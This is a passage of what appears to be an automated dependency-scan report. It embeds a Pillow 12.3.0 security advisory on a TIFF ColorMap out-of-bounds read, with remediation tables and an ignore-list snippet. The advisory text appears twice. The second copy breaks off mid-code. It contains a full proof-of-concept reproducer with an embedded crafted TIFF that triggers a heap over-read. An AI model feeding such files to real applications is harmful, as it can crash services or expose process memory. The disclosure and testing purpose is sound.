exact wheel above, an existing compatible macOS ARM64 CPython 3.11 interpreter, and an existing compatible Apple ASAN runtime. `--package-path` is the absolute directory containing `PIL`, not the `PIL` directory itself. The script does not install, download, build, patch, or submit anything. It checks selected key package files against the original installation's hashes and checks the loaded package/version; these checks are not a full installation attestation.\n\u003e \n\u003e Save the complete Python block below as `reproduce.py` and run:\n\u003e \n\u003e ```sh\n\u003e python3.11 -I -S -B reproduce.py \\\n\u003e   --package-path /absolute/path/to/reviewed/site-packages \\\n\u003e   --asan-runtime /absolute/path/to/reviewed/libclang_rt.asan_osx_dynamic.dylib\n\u003e ```\n\u003e \n\u003e Both arguments are required. The runtime must be loaded at child startup, not by late `dlopen`. Each child resolves `__asan_init`, `__asan_address_is_poisoned`, and `__asan_region_is_poisoned` in its actual process symbol table **before importing Pillow or opening a fixture**. Merely setting `DYLD_INSERT_LIBRARIES` is not accepted as proof of ASAN availability. A missing symbol or package mismatch prevents the operation.\n\u003e \n\u003e Each of the three cases runs once in a separate child with a **30-second wall limit, 10-second hard CPU limit, core dumps disabled, and 1 MiB regular-file-size limit**. The parent supplies a clean allowlisted environment, isolated Python startup (`-I -S -B`), an empty temporary working directory, no stdin, and a 128 KiB combined pipe-output cap. Timeout/output-cap handling kills the child's process group. These limits are containment measures, not a security sandbox. No TIFF is written to disk. Temporary directories are removed; raw diagnostics are never forwarded or persisted.\n\u003e \n\u003e The compressed/base64 constants below are the **unchanged original benign TIFF fixtures**, with decompressed size and SHA-256 checks. There are no external fixture dependencies. The standalone script supplied with this description is byte-for-byte the same as this block.\n\u003e \n\u003e **Separate August 31, 2026 inline validation:** the exact embedded standalone script passed all three fixed cases: one ASan READ of 131,072 bytes crossing a 1,536-byte allocation and two passing controls. Child guards and limits passed, with no timeout. This is additional bounded evidence, separate from earlier runs; no new build, install, full historical chain or older-version integration replay was performed.\n\u003e \n\u003e ## Expected results from the standalone script\n\u003e \n\u003e Cases run in order: `colormap8`, `colormap_absent`, `colormap16`. Every printed line should have `guard_passed: true`, `within_limits: true`, and `expected_observation: true`. The first two require successful saves and the expected retained sample-depth/ColorMap fields. The last requires ASAN exit 86 **and** the specific READ/extent/stack signatures, not merely any crash. Only the two controls inspect encoded metadata; the unsafe case never exports an encoded TIFF.\n\u003e \n\u003e The parent exits 0 only if all three expectations match; 1 means a case did not match (including guard failure or a changed ASAN diagnostic), and 2 means parent setup failed. A failed guard, timeout, unrelated crash, or missing diagnostic is **inconclusive**, not evidence that the defect is absent. Do not bypass the ASAN guard to obtain an output TIFF.\n\u003e \n\u003e ## Complete standalone reproducer\n\u003e \n\u003e ```python\n\u003e import argparse\n\u003e import base64\n\u003e import ctypes\n\u003e import hashlib\n\u003e import io\n\u003e import json\n\u003e import os\n\u003e from pathlib import Path\n\u003e import platform\n\u003e import resource\n\u003e import selectors\n\u003e import struct\n\u003e import subprocess\n\u003e import sys\n\u003e import tempfile\n\u003e import time\n\u003e import zlib\n\u003e \n\u003e \n\u003e FIXTURES = {'colormap8': [1684,\n\u003e                'fdb26d9135549ed44824901985086c5ee4f06515699ca3291e498c523935405c',\n\u003e                'eNrz9NRi4GBgYOBmYGBkYWAEssAYic3EyAymQaqYoWzWBgYGNigbhAWh6iexMTCIIomLIZkjDmUzAbEMkhoHIJsBiCYxjIJRMApGwSgY2QAAPu0DiA=='],\n\u003e  'colormap_absent': [137,\n\u003e                      'bd54979624f3ffb713342e0458caff9e17c477f940cda2f0960feebfabbc9556',\n\u003e                      'eNrz9NRi4GBgYOBiYGBkYWAEssAYic3EyAymBYCYGcpmbWBgYIOyQVgQqr4NiEWRxMWQzBGHspmBWAZJDQOEBgDj8wKm'],\n\u003e  'colormap16': [1685,\n\u003e                 '5f38e0ead90b97949fb0c98c63f9c68d00ba9181db6631ecb8927376dcc75f4d',\n\u003e                 'eNrz9NRi4GBgYOBmYGBkYWAEssAYic3EyAymBYCYGcpmbWBgYIOyQVgQqn4SGwODKJK4GJI54lA2MxDLIKlxALJBgpMYRsEoGAWjYBSMZACsEwB78wOS']}\n\u003e PACKAGE_PINS = {'PIL/ImageFile.py': '983c4f35e0c51046d4c636998ec77000cd2da208870a03b205e104cd0b2df629',\n\u003e  'PIL/_version.py': 'fe7d75d4019326aca24ae57d4ab190cd62ba1225b175051119cd61cd87e42b1d',\n\u003e  'PIL/__init__.py': '7361b6ad3878589affe5956e4a4da24d71398b0891fd3a8c15e9362217b4ca01',\n\u003e  'PIL/features.py': '14f904863b416914aaa6480735876ec31885b7272ee0d8d92b010c5b1b5e98f5',\n\u003e  'PIL/TiffTags.py': '766dea350424b9a2caab3513be794689403c2b7222cd038006f69cff08edb45d',\n\u003e  'PIL/TiffImagePlugin.py': '440b2a3a80b280d18cda3fc70d9fd206e2fa44e9897c9550f70b51395047b273',\n\u003e  'PIL/_imaging.cpython-311-darwin.so': '6d09b1fb925779fff32b5b8a4c348a42c201d350d0e0fd8cdc00410b6779e596',\n\u003e  'PIL/Image.py': '04af3f2db7ffdd61e829fa7aa8f5481d394a0a4129a8fd8aa5b13908928fcd6d',\n\u003e  'PIL/.dylibs/libtiff.6.dylib': 'e8988717b7470394a47d5ccd343130796b24ee70b6d885d3818e0e0b53238be1',\n\u003e  'pillow-12.3.0.dist-info/WHEEL': 'de2586b77651a8bf1b7778c3609979713ebc901784a837fca80ed4969fc82e57',\n\u003e  'pillow-12.3.0.dist-info/METADATA': '8fc07146cab33ef7582361dab6eac596d340b03ec648f18217da7894f73838c8'}\n\u003e CASES = tuple(FIXTURES)\n\u003e WALL_SECONDS = 30\n\u003e FILE_LIMIT = 1024 * 1024\n\u003e PIPE_LIMIT = 128 * 1024\n\u003e \n\u003e \n\u003e def limits():\n\u003e     resource.setrlimit(resource.RLIMIT_CORE, (0, 0))\n\u003e     resource.setrlimit(resource.RLIMIT_CPU, (10, 10))\n\u003e     resource.setrlimit(resource.RLIMIT_FSIZE, (FILE_LIMIT, FILE_LIMIT))\n\u003e \n\u003e \n\u003e def fixture(case):\n\u003e     size, expected_hash, encoded = FIXTURES[case]\n\u003e     decoder = zlib.decompressobj()\n\u003e     data = decoder.decompress(base64.b64decode(encoded, validate=True), size + 1)\n\u003e     if (len(data) != size or not decoder.eof or decoder.unused_data\n\u003e             or decoder.unconsumed_tail\n\u003e             or hashlib.sha256(data).hexdigest() != expected_hash):\n\u003e         raise ValueError(\"fixture integrity check failed\")\n\u003e     return data\n\u003e \n\u003e \n\u003e def field(data, wanted):\n\u003e     if len(data) \u003c 8 or data[:4] not in (b\"II*\\0\", b\"MM\\0*\"):\n\u003e         raise ValueError(\"not classic TIFF\")\n\u003e     endian = \"\u003c\" if data[:2] == b\"II\" else \"\u003e\"\n\u003e     directory = struct.unpack_from(endian + \"I\", data, 4)[0]\n\u003e     count = struct.unpack_from(endian + \"H\", data, directory)[0]\n\u003e     if directory + 2 + count * 12 + 4 \u003e len(data):\n\u003e         raise ValueError(\"truncated directory\")\n\u003e     for number in range(count):\n\u003e         offset = directory + 2 + number * 12\n\u003e         tag, kind, length = struct.unpack_from(endian + \"HHI\", data, offset)\n\u003e         if tag != wanted:\n\u003e             continue\n\u003e         size = {1: 1, 2: 1, 3: 2, 4: 4, 7: 1}[kind] * length\n\u003e         start = offset + 8 if size \u003c= 4 else struct.unpack_from(endian + \"I\", data, offset + 8)[0]\n\u003e         if start + size \u003e len(data):\n\u003e             raise ValueError(\"truncated field\")\n\u003e         return kind, length, data[start:start + size], endian\n\u003e     return None\n\u003e \n\u003e \n\u003e def checked_image_module(package):\n\u003e     if (sys.implementation.name != \"cpython\" or sys.version_info[:2] != (3, 11)\n\u003e             or sys.platform != \"darwin\" or platform.machine() != \"arm64\"):\n\u003e         raise RuntimeError(\"requires macOS ARM64 CPython 3.11\")\n\u003e     for relative, expected in PACKAGE_PINS.items():\n\u003e         path = (package / relative).resolve(strict=True)\n\u003e         if not path.is_relative_to(package) or hashlib.sha256(path.read_bytes()).hexdigest() != expected:\n\u003e             raise RuntimeError(\"reviewed wheel file mismatch\")\n\u003e     process_symbols = ctypes.CDLL(None)\n\u003e     for symbol in (\"__asan_init\", \"__asan_address_is_poisoned\", \"__asan_region_is_poisoned\"):\n\u003e         getattr(process_symbols, symbol)\n\u003e     sys.path.insert(0, str(package))\n\u003e     from PIL import Image, features\n\u003e     if (Image.__version__ != \"12.3.0\" or features.version(\"libtiff\") != \"4.7.1\"\n\u003e             or Path(Image.__file__).resolve() != package / \"PIL/Image.py\"\n\u003e             or Path(Image.core.__file__).resolve() != package / \"PIL/_imaging.cpython-311-darwin.so\"):\n\u003e         raise RuntimeError(\"unexpected Pillow or libtiff\")\n\u003e     return Image\n\u003e \n\u003e \n\u003e def emit(descriptor, message):\n\u003e     os.write(descriptor, (json.dumps(message, sort_keys=True) + \"\\n\").encode(\"ascii\"))\n\u003e \n\u003e \n\u003e def child(case, package):\n\u003e     descriptor = os.dup(1)\n\u003e     with open(os.devnull, \"wb\") as quiet:\n\u003e         os.dup2(quiet.fileno(), 1)\n\u003e     try:\n\u003e         image_module = checked_image_module(package)\n\u003e         data = fixture(case)\n\u003e         with image_module.open(io.BytesIO(data)) as image:\n\u003e             image.load()\n\u003e             if image.size != (1, 1) or image.info.get(\"compression\") != \"packbits\":\n\u003e                 raise ValueError(\"unexpected input geometry\")\n\u003e             bits = 8 if case == \"colormap8\" else 16\n\u003e             if image.tag_v2[258] != (bits,):\n\u003e                 raise ValueError(\"unexpected sample width\")\n\u003e             if case == \"colormap_absent\":\n\u003e                 if 320 in image.tag_v2:\n\u003e                     raise ValueError(\"unexpected ColorMap\")\n\u003e             elif image.tag_v2[320] != (0,) * 768:\n\u003e                 raise ValueError(\"unexpected ColorMap planes\")\n\u003e             emit(descriptor, {\"ready\": True})\n\u003e             with io.BytesIO() as output:\n\u003e                 image.save(output, format=\"TIFF\")\n\u003e                 if case == \"colormap16\":\n\u003e                     emit(descriptor, {\"unsafe_save_returned\": True})\n\u003e                     return 1\n\u003e                 encoded = output.getvalue()\n\u003e                 saved_bits = field(encoded, 258)\n\u003e                 map_field = field(encoded, 320)\n\u003e                 bits_preserved = (saved_bits is not None and saved_bits[:2] == (3, 1)\n\u003e                                   and struct.unpack(saved_bits[3] + \"H\", saved_bits[2])[0] == bits)\n\u003e                 map_preserved = (map_field is None if case == \"colormap_absent\"\n\u003e                                  else map_field is not None and map_field[:2] == (3, 768)\n\u003e                                  and map_field[2] == bytes(1536))\n\u003e                 emit(descriptor, {\"control_passed\": bool(bits_preserved and map_preserved)})\n\u003e         return 0\n\u003e     except Exception:\n\u003e         emit(descriptor, {\"child_failed\": True})\n\u003e         return 2\n\u003e     finally:\n\u003e         os.close(descriptor)\n\u003e \n\u003e \n\u003e def run_case(case, package, runtime):\n\u003e     with tempfile.TemporaryDirectory(prefix=\"pillow-check-\") as temporary:\n\u003e         environment = {\n\u003e             \"PATH\": \"/usr/bin:/bin:/usr/sbin:/sbin\",\n\u003e             \"HOME\": temporary,\n\u003e             \"TMPDIR\": temporary,\n\u003e             \"LC_ALL\": \"C\",\n\u003e             \"DYLD_INSERT_LIBRARIES\": str(runtime),\n\u003e             \"ASAN_OPTIONS\": \"detect_leaks=0:halt_on_error=1:abort_on_error=0:exitcode=86:\"\n\u003e                             \"disable_coredump=1:symbolize=1:malloc_fill_byte=165:\"\n\u003e                             \"max_malloc_fill_size=1048576:log_path=stderr\",\n\u003e         }\n\u003e         command = [sys.executable, \"-I\", \"-S\", \"-B\", str(Path(__file__).resolve()),\n\u003e                    \"--package-path\", str(package), \"--asan-runtime\", str(runtime), \"--child\", case]\n\u003e         output = bytearray()\n\u003e         diagnostics = bytearray()\n\u003e         deadline = time.monotonic() + WALL_SECONDS\n\u003e         with subprocess.Popen(command, cwd=temporary, env=environment, stdin=subprocess.DEVNULL,\n\u003e                               stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n\u003e                               preexec_fn=limits, start_new_session=True) as process:\n\u003e             bounded = True\n\u003e             try:\n\u003e                 with selectors.DefaultSelector() as selector:\n\u003e                     selector.register(process.stdout, selectors.EVENT_READ, output)\n\u003e                     selector.register(process.stderr, selectors.EVENT_READ, diagnostics)\n\u003e                     while selector.get_map():\n\u003e                         remaining = deadline - time.monotonic()\n\u003e                         if remaining \u003c= 0:\n\u003e                             raise TimeoutError\n\u003e                         for key, events in selector.select(min(remaining, 0.25)):\n\u003e                             chunk = os.read(key.fileobj.fileno(), 8192)\n\u003e                             if not chunk:\n\u003e                                 selector.unregister(key.fileobj)\n\u003e                             else:\n\u003e                                 key.data.extend(chunk)\n\u003e                                 if len(output) + len(diagnostics) \u003e PIPE_LIMIT:\n\u003e                                     raise BufferError\n\u003e                     process.wait(timeout=max(0.001, deadline - time.monotonic()))\n\u003e             except (TimeoutError, BufferError, subprocess.TimeoutExpired):\n\u003e                 bounded = False\n\u003e                 try:\n\u003e                     os.killpg(process.pid, 9)\n\u003e                 except ProcessLookupError:\n\u003e                     pass\n\u003e                 process.wait()\n\u003e             status = process.returncode\n\u003e         try:\n\u003e             messages = [json.loads(line) for line in output.splitlines()]\n\u003e         except (ValueError, UnicodeError):\n\u003e             messages = []\n\u003e         ready = bool(messages and messages[0] == {\"ready\": True})\n\u003e         if case == \"colormap16\":\n\u003e             observed = bool(bounded and ready and status == 86 and len(messages) == 1\n\u003e                             and b\"AddressSanitizer: heap-buffer-overflow\" in diagnostics\n\u003e                             and b\"READ of size 131072\" in diagnostics\n\u003e                             and b\"0 bytes after 1536-byte region\" in diagnostics\n\u003e                             and b\"PyImaging_LibTiffEncoderNew\" in diagnostics\n\u003e                             and b\"_TIFFmemcpy\" in diagnostics)\n\u003e         else:\n\u003e             observed = bool(bounded and ready and status == 0\n\u003e                             and messages == [{\"ready\": True}, {\"control_passed\": True}]\n\u003e                             and b\"AddressSanitizer:\" not in diagnostics)\n\u003e         output.clear()\n\u003e         diagnostics.clear()\n\u003e         return {\"case\": case, \"expected_observation\": observed, \"guard_passed\": ready,\n\u003e                 \"within_limits\": bounded}\n\u003e \n\u003e \n\u003e def main():\n\u003e     parser = argparse.ArgumentParser(description='Fixed ColorMap extent mismatch: controls first, ASAN-only trigger.')\n\u003e     parser.add_argument(\"--package-path\", required=True, type=Path,\n\u003e                         help=\"reviewed existing installation root containing PIL\")\n\u003e     parser.add_argument(\"--asan-runtime\", required=True, type=Path,\n\u003e                         help=\"reviewed existing compatible ASAN dylib; never loaded late\")\n\u003e     parser.add_argument(\"--child\", choices=CASES, help=argparse.SUPPRESS)\n\u003e     arguments = parser.parse_args()\n\u003e     if arguments.child:\n\u003e         limits()\n\u003e         return child(arguments.child, arguments.package_path.resolve())\n\u003e     try:\n\u003e         package = arguments.package_path.resolve(strict=True)\n\u003e         runtime = arguments.asan_runtime.resolve(strict=True)\n\u003e         if not package.is_dir() or not runtime.is_file():\n\u003e             raise ValueError(\"invalid existing paths\")\n\u003e         for case in CASES:\n\u003e             fixture(case)\n\u003e         results = [run_case(case, package, runtime) for case in CASES]\n\u003e     except Exception:\n\u003e         print(json.dumps({\"setup_failed\": True}))\n\u003e         return 2\n\u003e     for result in results:\n\u003e         print(json.dumps(result, sort_keys=True))\n\u003e     return 0 if all(result[\"expected_observation\"] for result in results) else 1\n\u003e \n\u003e \n\u003e if __name__ == \"__main__\":\n\u003e     raise SystemExit(main())\n\u003e ```\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-pchr-8j38-3x4p | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112896\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-112896](https://osv.dev/CVE-2026-112896)**.\n\n## [GHSA-pchr-8j38-3x4p](https://osv.dev/GHSA-pchr-8j38-3x4p)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e A small attacker-supplied TIFF can be opened and loaded normally, then reach an out-of-bounds read when an application saves it back to TIFF with retained metadata. The fixed reproducer is a 1×1, 16-bit grayscale, PackBits-compressed TIFF containing tag 320 (ColorMap) with **768 SHORT values**: three zero-filled planes of 256 entries each. No Python object is forged and no metadata is injected after loading.\n\u003e \n\u003e Pillow's TIFF encoder allocates **768 × 2 = 1536 bytes**, then passes three plane pointers separated by 256 SHORT entries to libtiff. With `BitsPerSample = 16`, libtiff instead expects **65536 SHORT values per plane** and attempts a **131072-byte read** from a plane pointer. Existing ASAN observations identify a heap-buffer-overflow READ crossing the 1536-byte allocation made in `PyImaging_LibTiffEncoderNew`.\n\u003e \n\u003e The malformed ColorMap need not be a valid palette for this grayscale image. The issue is that accepted metadata is forwarded on save without reconciling the fixed plane extent with the effective sample depth. Opening/loading alone is not the demonstrated fault; the encoder path is required.\n\u003e \n\u003e ## Impact and prerequisites\n\u003e \n\u003e An application must accept the input, retain the relevant TIFF metadata, and invoke the libtiff-backed TIFF save path. The observed consequence is an out-of-bounds read and ASAN termination. Process-memory exposure during encoding is a potential consequence, **not demonstrated by extracting arbitrary heap contents in this report**. No arbitrary read primitive, full memory-disclosure chain, code execution, address-space bypass, or cross-process effect is claimed.\n\u003e \n\u003e The 131072-byte attempted copy is not the number of bytes proven disclosed. This report does not run a synthetic-canary serializer or collect an unsanitized encoded output.\n\u003e \n\u003e ## Tested environment and limits of the evidence\n\u003e \n\u003e The existing observations were recorded on August 30, 2026, with **CPython 3.11.8 on macOS ARM64**, using the unmodified official **Pillow 12.3.0** wheel and its bundled **libtiff 4.7.1**:\n\u003e \n\u003e - Wheel: `pillow-12.3.0-cp311-cp311-macosx_11_0_arm64.whl`\n\u003e - Wheel size: `4785266` bytes\n\u003e - Wheel SHA-256: `37d6d0a00072fd2948eb22bce7e1475f34569d90c87c59f7a2ec59541b77f7a6`\n\u003e - Pillow source revision: `bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d`\n\u003e - Bundled libtiff SHA-256: `e8988717b7470394a47d5ccd343130796b24ee70b6d885d3818e0e0b53238be1`\n\u003e \n\u003e Apple's ASAN runtime was injected at process startup. This is **not an ASAN-rebuilt Pillow wheel**; allocation/memcpy interception detects the reported boundary violation, but the wheel's native instructions are not comprehensively instrumented.\n\u003e \n\u003e Only this concrete full-package environment is established here. No affected-version range, current development-branch result, or patched release is asserted. Severity is **Unknown**; no CVSS score is proposed.\n\u003e \n\u003e Separate earlier evidence reached the original Pillow 8.0.1 encoder constructor compiled as a component against a modern Python/libtiff environment. **That was not a complete Pillow 8.0.1 installation** and does not establish the historical package's full runtime behavior. It is not part of this reproducer or an affected-version range.\n\u003e \n\u003e ## Observed evidence and controls\n\u003e \n\u003e The earlier integration harness performed the natural sequence `Image.open(BytesIO(input))`, `image.load()`, then `image.save(BytesIO(), format=\"TIFF\")`, without replacing the image's metadata. Each case was recorded three times:\n\u003e \n\u003e | Original fixture | Bytes | Recorded result |\n\u003e | --- | ---: | --- |\n\u003e | `colormap16` | 1685 | Loaded as `I;16`; save terminated with ASAN exit 86, READ of size 131072 crossing a 1536-byte heap region (3/3). |\n\u003e | `colormap8` | 1684 | Same fixed ColorMap, but 8-bit samples; save succeeded and retained SHORT/count 768 (3/3). |\n\u003e | `colormap_absent` | 137 | Same 16-bit geometry without ColorMap; save succeeded (3/3). |\n\u003e \n\u003e Address-free summary of the recorded native diagnostic:\n\u003e \n\u003e ```text\n\u003e AddressSanitizer: heap-buffer-overflow\n\u003e READ of size 131072\n\u003e 0 bytes after 1536-byte region\n\u003e Copy path: memcpy -\u003e _TIFFmemcpy -\u003e setByteArray -\u003e _TIFFsetShortArrayExt\n\u003e            -\u003e _TIFFVSetField -\u003e TIFFVSetField -\u003e ImagingLibTiffSetField\n\u003e            -\u003e PyImaging_LibTiffEncoderNew\n\u003e Allocation: calloc -\u003e PyImaging_LibTiffEncoderNew\n\u003e ```\n\u003e \n\u003e Input SHA-256 values (also enforced inside the script):\n\u003e \n\u003e - `colormap16`: `5f38e0ead90b97949fb0c98c63f9c68d00ba9181db6631ecb8927376dcc75f4d`\n\u003e - `colormap8`: `fdb26d9135549ed44824901985086c5ee4f06515699ca3291e498c523935405c`\n\u003e - `colormap_absent`: `bd54979624f3ffb713342e0458caff9e17c477f940cda2f0960feebfabbc9556`\n\u003e \n\u003e ## Root cause and source references\n\u003e \n\u003e - [Pillow `src/encode.c`, lines 870–899, pinned revision](https://github.com/python-pillow/Pillow/blob/bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d/src/encode.c#L870): the ColorMap tuple must contain exactly 768 entries; a 1536-byte allocation is passed with a fixed stride of 256. The check does not reconcile that extent with `BitsPerSample`.\n\u003e - [Pillow `src/PIL/TiffImagePlugin.py`, lines 1944–1991, pinned revision](https://github.com/python-pillow/Pillow/blob/bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d/src/PIL/TiffImagePlugin.py#L1944): save carries supplied tags into the libtiff encoder and sorts the tags, so sample depth is established before ColorMap.\n\u003e - [libtiff `tif_dir.c`, lines 441–448, pinned revision](https://gitlab.com/libtiff/libtiff/-/blob/5fe20d0e9aba49a6a350ed533459d1505203838f/libtiff/tif_dir.c#L441): `TIFFTAG_COLORMAP` computes the per-plane count as `1L \u003c\u003c td-\u003etd_bitspersample` and copies that many SHORTs from each pointer.\n\u003e \n\u003e The reported boundary is Pillow's construction of a fixed-sized array for a native API whose required size depends on metadata; this does not establish a standalone libtiff defect for a correctly sized caller buffer.\n\u003e \n\u003e ## Prior art and disclosure scope\n\u003e \n\u003e [Pillow PR #5148](https://github.com/python-pillow/Pillow/pull/5148), merged December 28, 2020, is related TIFF metadata prior art, but its archived diff replaces a short-lived stack field-name pointer with the persistent literal `\"CustomField\"`. That is a **different field-name-lifetime fix**, not this plane-size mismatch. The reviewed material does not establish an exact prior public report or fix for this root, and **novelty is not asserted**. This specific report remains NOT_SENT; association with other observations is not a prior disclosure of it.\n\u003e \n\u003e ## Reproduction instructions\n\u003e \n\u003e Use an **already reviewed, existing** installation of the exact wheel above, an existing compatible macOS ARM64 CPython 3.11 interpreter, and an existing compatible Apple ASAN runtime. `--package-path` is the absolute directory containing `PIL`, not the `PIL` directory itself. The script does not install, download, build, patch, or submit anything. It checks selected key package files against the original installation's hashes and checks the loaded package/version; these checks are not a full installation attestation.\n\u003e \n\u003e Save the complete Python block below as `reproduce.py` and run:\n\u003e \n\u003e ```sh\n\u003e python3.11 -I -S -B reproduce.py \\\n\u003e   --package-path /absolute/path/to/reviewed/site-packages \\\n\u003e   --asan-runtime /absolute/path/to/reviewed/libclang_rt.asan_osx_dynamic.dylib\n\u003e ```\n\u003e \n\u003e Both arguments are required. The runtime must be loaded at child startup, not by late `dlopen`. Each child resolves `__asan_init`, `__asan_address_is_poisoned`, and `__asan_region_is_poisoned` in its actual process symbol table **before importing Pillow or opening a fixture**. Merely setting `DYLD_INSERT_LIBRARIES` is not accepted as proof of ASAN availability. A missing symbol or package mismatch prevents the operation.\n\u003e \n\u003e Each of the three cases runs once in a separate child with a **30-second wall limit, 10-second hard CPU limit, core dumps disabled, and 1 MiB regular-file-size limit**. The parent supplies a clean allowlisted environment, isolated Python startup (`-I -S -B`), an empty temporary working directory, no stdin, and a 128 KiB combined pipe-output cap. Timeout/output-cap handling kills the child's process group. These limits are containment measures, not a security sandbox. No TIFF is written to disk. Temporary directories are removed; raw diagnostics are never forwarded or persisted.\n\u003e \n\u003e The compressed/base64 constants below are the **unchanged original benign TIFF fixtures**, with decompressed size and SHA-256 checks. There are no external fixture dependencies. The standalone script supplied with this description is byte-for-byte the same as this block.\n\u003e \n\u003e **Separate August 31, 2026 inline validation:** the exact embedded standalone script passed all three fixed cases: one ASan READ of 131,072 bytes crossing a 1,536-byte allocation and two passing controls. Child guards and limits passed, with no timeout. This is additional bounded evidence, separate from earlier runs; no new build, install, full historical chain or older-version integration replay was performed.\n\u003e \n\u003e ## Expected results from the standalone script\n\u003e \n\u003e Cases run in order: `colormap8`, `colormap_absent`, `colormap16`. Every printed line should have `guard_passed: true`, `within_limits: true`, and `expected_observation: true`. The first two require successful saves and the expected retained sample-depth/ColorMap fields. The last requires ASAN exit 86 **and** the specific READ/extent/stack signatures, not merely any crash. Only the two controls inspect encoded metadata; the unsafe case never exports an encoded TIFF.\n\u003e \n\u003e The parent exits 0 only if all three expectations match; 1 means a case did not match (including guard failure or a changed ASAN diagnostic), and 2 means parent setup failed. A failed guard, timeout, unrelated crash, or missing diagnostic is **inconclusive**, not evidence that the defect is absent. Do not bypass the ASAN guard to obtain an output TIFF.\n\u003e \n\u003e ## Complete standalone reproducer\n\u003e \n\u003e ```python\n\u003e import argparse\n\u003e import base64\n\u003e import ctypes\n\u003e import hashlib\n\u003e import io\n\u003e import json\n\u003e import os\n\u003e from pathlib import Path\n\u003e import platform\n\u003e import resource\n\u003e import selectors\n\u003e import struct\n\u003e import subprocess\n\u003e import sys\n\u003e import tempfile\n\u003e import time\n\u003e import zlib\n\u003e \n\u003e \n\u003e FIXTURES = {'colormap8': [1684,\n\u003e                'fdb26d9135549ed44824901985086c5ee4f06515699ca3291e498c523935405c',\n\u003e                'eNrz9NRi4GBgYOBmYGBkYWAEssAYic3EyAymQaqYoWzWBgYGNigbhAWh6iexMTCIIomLIZkjDmUzAbEMkhoHIJsBiCYxjIJRMApGwSgY2QAAPu0DiA=='],\n\u003e  'colormap_absent': [137,\n\u003e                      'bd54979624f3ffb713342e0458caff9e17c477f940cda2f0960feebfabbc9556',\n\u003e                      'eNrz9NRi4GBgYOBiYGBkYWAEssAYic3EyAymBYCYGcpmbWBgYIOyQVgQqr4NiEWRxMWQzBGHspmBWAZJDQOEBgDj8wKm'],\n\u003e  'colormap16': [1685,\n\u003e                 '5f38e0ead90b97949fb0c98c63f9c68d00ba9181db6631ecb8927376dcc75f4d',\n\u003e                 'eNrz9NRi4GBgYOBmYGBkYWAEssAYic3EyAymBYCYGcpmbWBgYIOyQVgQqn4SGwODKJK4GJI54lA2MxDLIKlxALJBgpMYRsEoGAWjYBSMZACsEwB78wOS']}\n\u003e PACKAGE_PINS = {'PIL/ImageFile.py': '983c4f35e0c51046d4c636998ec77000cd2da208870a03b205e104cd0b2df629',\n\u003e  'PIL/_version.py': 'fe7d75d4019326aca24ae57d4ab190cd62ba1225b175051119cd61cd87e42b1d',\n\u003e  'PIL/__init__.py': '7361b6ad3878589affe5956e4a4da24d71398b0891fd3a8c15e9362217b4ca01',\n\u003e  'PIL/features.py': '14f904863b416914aaa6480735876ec31885b7272ee0d8d92b010c5b1b5e98f5',\n\u003e  'PIL/TiffTags.py': '766dea350424b9a2caab3513be794689403c2b7222cd038006f69cff08edb45d',\n\u003e  'PIL/TiffImagePlugin.py': '440b2a3a80b280d18cda3fc70d9fd206e2fa44e9897c9550f70b51395047b273',\n\u003e  'PIL/_imaging.cpython-311-darwin.so': '6d09b1fb925779fff32b5b8a4c348a42c201d350d0e0fd8cdc00410b6779e596',\n\u003e  'PIL/Image.py': '04af3f2db7ffdd61e829fa7aa8f5481d394a0a4129a8fd8aa5b13908928fcd6d',\n\u003e  'PIL/.dylibs/libtiff.6.dylib': 'e8988717b7470394a47d5ccd343130796b24ee70b6d885d3818e0e0b53238be1',\n\u003e  'pillow-12.3.0.dist-info/WHEEL': 'de2586b77651a8bf1b7778c3609979713ebc901784a837fca80ed4969fc82e57',\n\u003e  'pillow-12.3.0.dist-info/METADATA': '8fc07146cab33ef7582361dab6eac596d340b03ec648f18217da7894f73838c8'}\n\u003e CASES = tuple(FIXTURES)\n\u003e WALL_SECONDS = 30\n\u003e FILE_LIMIT = 1024 * 1024\n\u003e PIPE_LIMIT = 128 * 1024\n\u003e \n\u003e \n\u003e def limits():\n\u003e     resource.setrlimit(resource.RLIMIT_CORE, (0, 0))\n\u003e     resource.setrlimit(resource.RLIMIT_CPU, (10, 10))\n\u003e     resource.setrlimit(resource.RLIMIT_FSIZE, (FILE_LIMIT, FILE_LIMIT))\n\u003e \n\u003e \n\u003e def fixture(case):\n\u003e     size, expected_hash, encoded = FIXTURES[case]\n\u003e     decoder = zlib.decompressobj()\n\u003e     data = decoder.decompress(base64.b64decode(encoded, validate=True), size + 1)\n\u003e     if (len(data) != size or not decoder.eof or decoder.unused_data\n\u003e             or decoder.unconsumed_tail\n\u003e             or hashlib.sha256(data).hexdigest() != expected_hash):\n\u003e         raise ValueError(\"fixture integrity check failed\")\n\u003e     return data\n\u003e \n\u003e \n\u003e def field(data, wanted):\n\u003e     if len(data) \u003c 8 or data[:4] not in (b\"II*\\0\", b\"MM\\0*\"):\n\u003e         raise ValueError(\"not classic TIFF\")\n\u003e     endian = \"\u003c\" if data[:2] == b\"II\" else \"\u003e\"\n\u003e     directory = struct.unpack_from(endian + \"I\", data, 4)[0]\n\u003e     count = struct.unpack_from(endian + \"H\", data, directory)[0]\n\u003e     if directory + 2 + count * 12 + 4 \u003e len(data):\n\u003e         raise ValueError(\"truncated directory\")\n\u003e     for number in range(count):\n\u003e         offset = directory + 2 + number * 12\n\u003e         tag, kind, length = 